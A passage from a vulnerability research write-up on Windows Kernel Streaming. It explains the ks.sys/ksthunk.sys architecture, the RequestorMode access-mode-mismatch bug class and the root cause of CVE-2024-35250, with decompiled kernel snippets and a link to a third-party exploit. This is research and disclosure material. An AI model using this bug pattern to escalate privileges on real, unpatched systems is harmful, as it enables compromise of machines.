&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240823/7.png&quot; alt=&quot;&quot; /&gt;
 (From: https://learn.microsoft.com/en-us/windows-hardware/drivers/audio/audio-filters)&lt;/p&gt;

&lt;h4 id=&quot;ks-pins&quot;&gt;KS pins&lt;/h4&gt;
&lt;p&gt;In the figure above, the points for reading and outputting data are called pins. The kernel also has corresponding KS pin Objects to describe the Pins, recording whether the Pin is a sink or a source, the data format for input and output, and so on. When we use it, we must &lt;a href=&quot;https://learn.microsoft.com/zh-tw/windows-hardware/drivers/ddi/ks/nf-ks-kscreatepin&quot;&gt;open a pin&lt;/a&gt; on the filters to create an instance to read from or write to the device.&lt;/p&gt;

&lt;h3 id=&quot;ks-property&quot;&gt;KS property&lt;/h3&gt;

&lt;p&gt;Each of these KS objects will have its own property, and each property corresponds to a specific feature. For instance, the data format mentioned earlier in the Pin, the volume level, and the status of the device are all properties. These properties typically correspond to a set of GUIDs. We can set these properties through &lt;a href=&quot;https://learn.microsoft.com/zh-tw/windows-hardware/drivers/ddi/ks/ni-ks-ioctl_ks_property&quot;&gt;IOCTL_KS_PROPERTY&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;This greatly simplifies the development of multimedia drivers and ensures consistency and scalability across different devices.&lt;/p&gt;

&lt;h3 id=&quot;read-streams-from-webcam&quot;&gt;Read streams from webcam&lt;/h3&gt;
&lt;p&gt;Here is a simple example illustrating how an application can read data from a webcam.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240823/8.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The most basic flow is roughly shown in this diagram:&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;Open the device to obtain the device handle.&lt;/li&gt;
  &lt;li&gt;Use this device handle to create an instance of the Pin on this filter and obtain the Pin handle.&lt;/li&gt;
  &lt;li&gt;Use &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;IOCTL_KS_PROPERTY&lt;/code&gt; to set the device state of the Pin to RUN.&lt;/li&gt;
  &lt;li&gt;Finally, you can use &lt;a href=&quot;https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/ks/ni-ks-ioctl_ks_read_stream&quot;&gt;IOCTL_KS_READ_STREAM&lt;/a&gt; to read data from this Pin.&lt;/li&gt;
&lt;/ol&gt;

&lt;h2 id=&quot;kernel-streaming-architecture&quot;&gt;Kernel Streaming architecture&lt;/h2&gt;
&lt;blockquote&gt;
  &lt;p&gt;For vulnerability research, we must first understand its architecture and consider the potential attack surfaces.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;After gaining a preliminary understanding of the functionalities and operations of Kernel Streaming, we need to understand the architecture to find vulnerabilities. Itâ€™s crucial to know how Windows implements these functions and what components are involved. This way, we can identify which sys files to analyze and where to start.&lt;/p&gt;

&lt;p&gt;After our analysis, the overall architecture looks approximately like this diagram:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240823/9.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;In the Kernel Streaming components, the most important ones are &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ksthunk.sys&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ks.sys&lt;/code&gt;. Almost all functionalities are related to them.&lt;/p&gt;

&lt;h3 id=&quot;ksthunk-kernel-streaming-wow-thunk-service-driver&quot;&gt;ksthunk (Kernel Streaming WOW Thunk Service Driver)&lt;/h3&gt;
&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ksthunk.sys&lt;/code&gt; is the entry point in Kernel Streaming. Its function is quite simple: it converts 32-bit requests from the WoW64 process into 64-bit requests, allowing the underlying driver to handle the requests without additional processing for 32-bit structures.&lt;/p&gt;

&lt;h3 id=&quot;ks-kernel-connection-and-streaming-architecture-library&quot;&gt;ks (Kernel Connection and Streaming Architecture Library)&lt;/h3&gt;
&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ks.sys&lt;/code&gt; is one of the &lt;strong&gt;core components of Kernel Streaming&lt;/strong&gt;. It is the library of Kernel Streaming responsible for forwarding requests such as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;IOCTL_KS_PROPERTY&lt;/code&gt; to the corresponding device driver, and it also handles functions related to AVStream.&lt;/p&gt;

&lt;h3 id=&quot;the-work-flow-of-ioctl_ks_&quot;&gt;The work flow of IOCTL_KS_*&lt;/h3&gt;
&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;IOCTL_KS_PROPERTY&lt;/code&gt; will be used as an example here. When calling &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;DeviceIoControl&lt;/code&gt;, as shown in the figure below, the userâ€™s request will be sequentially passed to the corresponding driver for processing.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240823/10.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;At step 6, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ks.sys&lt;/code&gt; will determine which driver and handler to hand over your request based on the &lt;a href=&quot;https://learn.microsoft.com/en-us/windows-hardware/drivers/stream/ksproperty-structure&quot;&gt;KSPROPERTY&lt;/a&gt; you requested.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240823/11.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Finally, forward it to the corresponding driver, as shown in the figure above, where it is ultimately forwarded to the handler in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;portcls&lt;/code&gt; to operate the audio device.&lt;/p&gt;

&lt;p&gt;You should now have a preliminary understanding of the architecture and process of Kernel Streaming. Next, itâ€™s time to look for vulnerabilities.&lt;/p&gt;

&lt;p&gt;Based on the existing elements, which attack surfaces are worth examining?&lt;/p&gt;

&lt;h3 id=&quot;from-attackers-view&quot;&gt;From attackerâ€™s view&lt;/h3&gt;
&lt;blockquote&gt;
  &lt;p&gt;ã€€Before digging for vulnerabilities, if you can carefully consider under what circumstances they are likely to occur, you can achieve twice the result with half the effort.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;From a vulnerability researcherâ€™s perspective, there are a few key points to consider:&lt;/p&gt;

&lt;h4 id=&quot;1-property-handler-in-each-device&quot;&gt;1. Property handler in each device&lt;/h4&gt;
&lt;p&gt;KS object for each device has its own properties, and each property has its own handler. Some properties are prone to issues during handling.&lt;/p&gt;

&lt;h4 id=&quot;2-ks-and-ksthunk&quot;&gt;2. ks and ksthunk&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ks&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ksthunk&lt;/code&gt; have not had vulnerabilities for a long time, but they are the most accessible entry points and might be good targets. The last vulnerabilities(&lt;a href=&quot;https://msrc.microsoft.com/update-guide/en-us/vulnerability/CVE-2020-16889&quot;&gt;CVE-2020-16889&lt;/a&gt; and &lt;a href=&quot;https://msrc.microsoft.com/update-guide/en-US/vulnerability/CVE-2020-17045&quot;&gt;CVE-2020-17045&lt;/a&gt;) were found in 2020 by &lt;a href=&quot;https://x.com/nghiadt1098&quot;&gt;@nghiadt1098&lt;/a&gt;.&lt;/p&gt;

&lt;h4 id=&quot;3-each-driver-handles-a-part-of-the-content&quot;&gt;3. Each driver handles a part of the content&lt;/h4&gt;
&lt;p&gt;In some functionalities of Kernel Streaming, certain drivers handle parts of the input individually, which may lead to inconsistencies.&lt;/p&gt;

&lt;p&gt;After reviewing Kernel Streaming from the above perspectives, we quickly identified several relatively easy-to-discover vulnerabilities.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;portcls.sys
    &lt;ul&gt;
      &lt;li&gt;CVE-2024-38055 (out-of-bounds read when set dataformat for Pin)&lt;/li&gt;
      &lt;li&gt;CVE-2024-38056&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;ksthunk
    &lt;ul&gt;
      &lt;li&gt;CVE-2024-38054 (out-of-bounds write)&lt;/li&gt;
      &lt;li&gt;CVE-2024-38057&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;However, we will not be explaining these vulnerabilities one by one. Most of these are obvious issues such as unchecked length or index leading to out-of-bounds access.  &lt;a href=&quot;https://x.com/Fr0st1706&quot;&gt;@Fr0st1706&lt;/a&gt; also wrote an &lt;a href=&quot;https://github.com/Black-Frost/windows-learning/tree/main/CVE-2024-38054&quot;&gt;exploit for CVE-2024-38054&lt;/a&gt; recently. We might slowly explain these in subsequent parts in the future. We will leave this for the readers to study for now.&lt;/p&gt;

&lt;p&gt;During the review process, we discovered some interesting things. Do you think the following code snippet is really fine?&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-cpp=&quot;&gt;__int64 __fastcall CKSThunkDevice::CheckIrpForStackAdjustmentNative(__int64 a1, struct _IRP *irp, __int64 a3, int *a4)
{

    if ( irp-&amp;gt;RequestorMode )
    {
        v14 = 0xC0000010;
    }
    else
    {
        UserBuffer = (unsigned int *)irp-&amp;gt;UserBuffer;
        ...
        v14 = (*(__int64 (__fastcall **)(_QWORD, _QWORD, __int64 *))    (Type3InputBuffer + 0x38))(// call Type3InputBuffer+0x38
                *UserBuffer,
                0LL,
               v19);
    }
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Seeing this code reminds me of &lt;a href=&quot;https://decoded.avast.io/janvojtesek/lazarus-and-the-fudmodule-rootkit-beyond-byovd-with-an-admin-to-kernel-zero-day/&quot;&gt;CVE-2024-21338&lt;/a&gt;. Initially, the vulnerability had no checks, but after patching, &lt;a href=&quot;https://learn.microsoft.com/zh-tw/windows-hardware/drivers/ddi/wdm/nf-wdm-exgetpreviousmode&quot;&gt;ExGetPreviousMode&lt;/a&gt; was added. However, the check here uses the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;RequestorMode&lt;/code&gt; in &lt;a href=&quot;https://learn.microsoft.com/zh-tw/windows-hardware/drivers/ddi/wdm/ns-wdm-_irp&quot;&gt;IRP&lt;/a&gt; for validation. Generally, the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;RequestorMode&lt;/code&gt; from a user-called IOCTL will be &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;UserMode(1)&lt;/code&gt;, so there shouldnâ€™t be any issues.&lt;/p&gt;

&lt;p&gt;At this point, I also recall &lt;a href=&quot;https://x.com/tiraniddo&quot;&gt;James Forshaw&lt;/a&gt;â€™s article &lt;a href=&quot;https://googleprojectzero.blogspot.com/2019/03/windows-kernel-logic-bug-class-access.html&quot;&gt;Windows Kernel Logic Bug Class: Access Mode Mismatch in IO Manager&lt;/a&gt;.&lt;/p&gt;

&lt;h2 id=&quot;the-overlooked-bug-class&quot;&gt;The overlooked bug class&lt;/h2&gt;
&lt;p&gt;First, we need to mention a few terms and concepts. If you are already familiar with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Previous Mode&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;RequestorMode&lt;/code&gt;, you can skip to &lt;a href=&quot;#A-logical-bug-class&quot;&gt;A logical bug class&lt;/a&gt; section.&lt;/p&gt;

&lt;h3 id=&quot;previousmode&quot;&gt;PreviousMode&lt;/h3&gt;
&lt;p&gt;The first one is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;PreviousMode&lt;/code&gt;. In an Application, if a user operates on a device or file through &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Nt*&lt;/code&gt; System Service Call, upon entering the kernel, it will be marked as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;UserMode(1)&lt;/code&gt; in &lt;a href=&quot;https://learn.microsoft.com/zh-tw/windows-hardware/drivers/kernel/eprocess#ethread&quot;&gt;_ETHREAD&lt;/a&gt;â€™s &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;PreviousMode&lt;/code&gt;, indicating that this System Service Call is from the user. Conversely, if it is called from kernel mode, such as a device driver invoking the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Zw*&lt;/code&gt; System Service Call, it will be marked as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;KernelMode(0)&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240823/12.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;requestormode&quot;&gt;RequestorMode&lt;/h3&gt;
&lt;p&gt;Another similar field is the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;RequestorMode&lt;/code&gt; in the IRP. This field records whether your original request came from &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;UserMode&lt;/code&gt; or &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;KernelMode&lt;/code&gt;. In kernel driver code, this is a very commonly used field, typically derived from &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;PreviousMode&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;It is often used to decide whether to perform additional checks on user requests, such as Memory Access Check or Security Access Check. In the example below, if the request comes from &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;UserMode&lt;/code&gt;, it will check the user-provided address. If it comes from the Kernel, no additional checks are performed to increase efficiency.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240823/13.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;But in reality, this has also led to some issues.&lt;/p&gt;

&lt;h3 id=&quot;a-logical-bug-class&quot;&gt;A logical bug class&lt;/h3&gt;
&lt;p&gt;&lt;a href=&quot;https://x.com/tiraniddo&quot;&gt;James Forshaw&lt;/a&gt;â€™s &lt;a href=&quot;https://googleprojectzero.blogspot.com/2019/03/windows-kernel-logic-bug-class-access.html&quot;&gt;Windows Kernel Logic Bug Class: Access Mode Mismatch in IO Manager&lt;/a&gt; mentions a type of Bug Class.&lt;/p&gt;

&lt;p&gt;What would happen if a user calls a System Service Call like &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;NtDeviceIoControlFile&lt;/code&gt;, and then the driver handling it uses user-controllable data as parameters for &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ZwOpenFile&lt;/code&gt;?&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240823/14.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;After the driver calls &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ZwOpenFile&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;PreviousMode&lt;/code&gt; will switch to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;KernelMode&lt;/code&gt;, and when it uses &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;NtOpenFile&lt;/code&gt; processing, most checks will be skipped due to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;PreviousMode&lt;/code&gt; being &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;KernelMode&lt;/code&gt;. Subsequently, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Irp-&amp;gt;RequestorMode&lt;/code&gt; will become &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;KernelMode&lt;/code&gt;,  bypassing the Security Access Check and Memory Access Check. However, this largely depends on how the subsequent driver implements these checks. There might be issues if it relies solely onÂ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;RequestorMode&lt;/code&gt;Â to decide whether to perform checks The actual situation is slightly more complex and related to the flags of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;CreateFile&lt;/code&gt;. For details, refer to the following articles:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://googleprojectzero.blogspot.com/2019/03/windows-kernel-logic-bug-class-access.html&quot;&gt;Windows Kernel Logic Bug Class: Access Mode Mismatch in IO Manager&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://googleprojectzero.blogspot.com/2021/01/hunting-for-bugs-in-windows-mini-filter.html&quot;&gt;Hunting for Bugs in Windows Mini-Filter Drivers&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://msrc.microsoft.com/blog/2019/03/local-privilege-escalation-via-the-windows-i-o-manager-a-variant-finding-collaboration/&quot;&gt;Local privilege escalation via the Windows I/O Manager: a variant finding collaboration&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;These studies mainly focused on the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Zw*&lt;/code&gt; series of System Service Call. Are there other similar situations that could also cause this kind of logical vulnerability?&lt;/p&gt;

&lt;h4 id=&quot;the-new-bug-pattern&quot;&gt;The new bug pattern&lt;/h4&gt;
&lt;p&gt;Actually, it is possible. When the device driver uses &lt;a href=&quot;https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-iobuilddeviceiocontrolrequest&quot;&gt;IoBuildDeviceIoControlRequest&lt;/a&gt; to create a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;DeviceIoControl&lt;/code&gt; IRP, it is easy to encounter such issues if not careful. This API is primarily used by kernel drivers to call IOCTL, and it helps you build the IRP. Subsequently, calling &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;IofCallDriver&lt;/code&gt; allows you to call IOCTL within the kernel driver. On &lt;a href=&quot;https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-iobuilddeviceiocontrolrequest#remarks&quot;&gt;Microsoft Learn&lt;/a&gt;, there is a particular passage worth noting.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240823/15.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;By default, if you do not explicitly set the &lt;strong&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;RequestorMode&lt;/code&gt;&lt;/strong&gt;, it will directly call IOCTL with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;KernelMode&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240823/16.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Following this approach, we revisited Kernel Streaming and discovered an intriguing aspect.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240823/17.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The function where &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;IoBuildDeviceIoControlRequest&lt;/code&gt; is used in Kernel Streaming is in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ks!KsSynchronousIoControlDevice&lt;/code&gt; and it obviously involves calling IOCTL in the kernel using the aforementioned method. However, it appears that &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Irp-&amp;gt;RequestorMode&lt;/code&gt; is properly set here, and different values are assigned based on the parameters of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;KsSynchronousIoControlDevice&lt;/code&gt;. This will be a convenient library for kernel streaming driver developers.&lt;/p&gt;

&lt;p&gt;Howeverâ€¦&lt;/p&gt;

&lt;p&gt;ks!CKsPin::GetState
&lt;img src=&quot;/assets/img/blog/20240823/18.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;ks!SerializePropertySet
&lt;img src=&quot;/assets/img/blog/20240823/19.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;ks!UnserializePropertySet
&lt;img src=&quot;/assets/img/blog/20240823/20.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We found that in Kernel Streaming, all functions using &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;KsSynchronousIoControlDevice&lt;/code&gt; consistently use &lt;strong&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;KernelMode(0)&lt;/code&gt;&lt;/strong&gt;. At this point, we can carefully inspect whether the places it is used have any security issues. Therefore, we convert the bug pattern in Kernel Streaming into the following points:&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;Utilized &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;KsSynchronousIoControlDevice&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;Controllable InputBuffer &amp;amp; OutputBuffer&lt;/li&gt;
  &lt;li&gt;The second processing of IOCTL relies on &lt;strong&gt;RequestorMode&lt;/strong&gt; for security checks
 &lt;img src=&quot;/assets/img/blog/20240823/21.png&quot; alt=&quot;&quot; /&gt;&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;Following this pattern, we quickly found the first vulnerability.&lt;/p&gt;

&lt;h2 id=&quot;the-vulnerability--exploitation&quot;&gt;The vulnerability &amp;amp; exploitation&lt;/h2&gt;

&lt;h3 id=&quot;cve-2024-35250&quot;&gt;CVE-2024-35250&lt;/h3&gt;

&lt;p&gt;This vulnerability is also the one we used in &lt;a href=&quot;https://x.com/thezdi/status/1770517322203070674&quot;&gt;Pwn2Own Vancouver 2024&lt;/a&gt;. In the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;IOCTL_KS_PROPERTY&lt;/code&gt; of Kernel Streaming, to increase efficiency, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;KSPROPERTY_TYPE_SERIALIZESET&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;KSPROPERTY_TYPE_UNSERIALIZESET&lt;/code&gt; requests are provided to allow users to operate on multiple properties through a single call.  These types of requests will be broken down into multiple calls by the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;KsPropertyHandler&lt;/code&gt;. For more details, refer to &lt;a href=&quot;https://learn.microsoft.com/en-us/windows-hardware/drivers/stream/ksproperty-structure#remarks&quot;&gt;this one&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;It is implemented in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ks.sys&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240823/22.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;When handling property in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ks.sys&lt;/code&gt;, if the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;KSPROPERTY_TYPE_UNSERIALIZESET&lt;/code&gt; flag is provided, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ks!UnserializePropertySet&lt;/code&gt; will handle your request.&lt;/p&gt;

&lt;p&gt;Letâ€™s take a look at &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;UnserializePropertySet&lt;/code&gt;.&lt;/p&gt;

&lt;div class=&quot;language-cpp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;__int64&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;__fastcall&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;UnserializePropertySet&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;PIRP&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;irp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;KSIDENTIFIER&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;UserProvideProperty&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;KSPROPERTY_SET&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;propertyset_&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;New_KsProperty_req&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ExAllocatePoolWithTag&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;NonPagedPoolNx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;InSize&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x7070534Bu&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;memmove&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;New_KsProperty_req&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;CurrentStackLocation&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Parameters&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;DeviceIoControl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Type3InputBuffer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;InSize&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;//------[1] &lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;status&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;KsSynchronousIoControlDevice&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;CurrentStackLocation&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;FileObject&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
            &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;CurrentStackLocation&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Parameters&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;DeviceIoControl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;IoControlCode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;New_KsProperty_req&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;InSize&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;OutBuffer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;OutSize&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
            &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;BytesReturned&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;//-----------[2]&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;You can see that during the processing, the original request is first copied into a newly allocated buffer at [1]. Subsequently, this buffer is used to call the new IOCTL using &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;KsSynchronousIoControlDevice&lt;/code&gt; at [2]. Both &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;New_KsProperty_req&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;OutBuffer&lt;/code&gt; are contents provided by the user.&lt;/p&gt;

&lt;p&gt;The flow when calling &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;UnserializePropertySet&lt;/code&gt; is roughly as illustrated below:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240823/23.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

